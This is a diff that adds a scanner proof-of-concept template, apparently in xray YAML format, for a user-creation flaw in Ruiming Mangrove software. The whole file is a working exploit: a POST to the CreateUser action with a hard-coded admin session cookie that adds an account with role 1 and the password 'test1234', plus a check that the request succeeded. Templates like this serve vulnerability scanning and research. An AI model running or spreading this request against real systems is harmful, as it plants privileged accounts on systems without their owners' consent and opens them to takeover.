@@ -1,0 +1,29 @@
+name: poc-yaml-ruiming-Mangrove-User-addition
+transport: http
+
+
+set:
+  username: randomLowercase(6)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Mvsp/RoleUserInfo/Default.do?Action=CreateUser&Type=post&DataType=Text&Guid=1721290869914
+      headers:
+        Upgrade-Insecure-Requests: 1
+        Cookie: MVSP.U=VUlEPTEmVU49YWRtaW4yJkdJRD0xJlJJRD0x;
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+      body: UserId=&GroupPower=1&VehiclePower=&UserName={{username}}&RoleId=1&GroupId=1&ValidTime=&VideoTime=1&Enable=1&TelNo=1&Flow=&WarningFlow=&RealFlow=&MonthlyTime=&Description=&Email=&Password=test1234
+    expression: response.status == 200 && response.body.bcontains(b'"Code":200') && response.body.bcontains(b'"Result":true')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487989&idx=1&sn=36de2d8cffa01df2ff2afe96ca82bfd6&chksm=c267a4c6f5102dd0cfd9a01660f9dbb04577f303558a3ab2c19c328b0fe51892189fcf6ecaf3&token=48786214&lang=zh_CN#rd
+
+
+
